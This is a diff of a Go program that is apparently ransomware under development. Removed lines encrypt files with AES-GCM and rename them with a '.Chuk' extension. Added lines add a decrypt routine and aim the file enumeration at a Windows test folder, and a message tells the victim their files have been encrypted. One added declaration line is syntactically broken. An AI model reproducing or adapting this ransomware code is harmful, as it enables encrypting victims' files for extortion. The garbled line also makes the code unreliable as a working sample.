@@ -15,6 +15,7 @@
 	  var k [32]byte
 	  var shared [32]byte
 	  var pub [32]byte
+	  var fol [32]string={"
 	  var priv [32]byte
 	  var pub2 =[32]byte{14, 54, 78 ,147, 219, 46, 173, 49, 165, 160, 248, 99, 188, 13, 95, 179, 5, 10, 26, 85, 28, 82, 38, 225, 157, 246, 167, 8 ,85, 204, 233 ,12}
 		func GenerateKeyPair()([]byte){
@@ -34,47 +35,43 @@
 
 		}
 		
-	  func EncryptFile(filename string) {
-		// Read the file into memory.
-		plaintext, err := os.ReadFile(filename)
-		if err != nil {
-		  panic(err)
-		}
-		e := os.Rename(filename, filename+".Chuk")
-	  if e != nil {
-		fmt.Println(e)
-		return
-	  }
-		
+	 func DecryptFile( filename string) {
+	// Read the encrypted file into memory.
+	ciphertext, err := os.ReadFile(filename)
+	if err != nil {
+		panic(err)
+	}
 
-		// Create a new AES cipher block.
-		block, err := aes.NewCipher(k[:])
-		if err != nil {
-		  panic(err)
-		}
+	// Create a new AES cipher block.
+	block, err := aes.NewCipher(k[:])
+	if err != nil {
+		panic(err)
+	}
 
-		// Create a new GCM cipher.
-		aesgcm, err := cipher.NewGCM(block)
-		if err != nil {
-		  panic(err)
-		}
+	// Create a new GCM cipher.
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		panic(err)
+	}
 
-		// Create a new nonce.
-		nonce := make([]byte, aesgcm.NonceSize())
-		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		  panic(err)
-		}
+	// Get the nonce size.
+	nonceSize := aesgcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		panic(err)
+	}
 
-		// Encrypt the data.
-		ciphertext := aesgcm.Seal(nonce, nonce, plaintext, nil)
+	// Decrypt the data.
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		panic(err)
+	}
 
-		// Write the encrypted data back to the file.
-		if err := os.WriteFile(filename+".enc", ciphertext, 0644); err != nil {
-		  panic(err)
-		}
-	  }
-
-		
+	// Write the decrypted data back to the file.
+	if err := os.WriteFile(filename+".enc", plaintext, 0644); err != nil {
+		panic(err)
+	}
+}
 		
 		
 		
@@ -119,7 +116,7 @@
 		GenerateKeyPair()
 		//fmt.Println("a chave e  ",GenerateKeyPair())
 		
-		  EnumerateFiles("")
+		  EnumerateFiles("C:\\Users\\RootkitAdmin\\Desktop\\Projeto Go\\Teste")
 		  fmt.Println("seus arquivos foram criptografados  guarde sua chave publica",pub)
 		  //os.Create("chave.txt")
 		  file, err := os.Create("chave.txt")
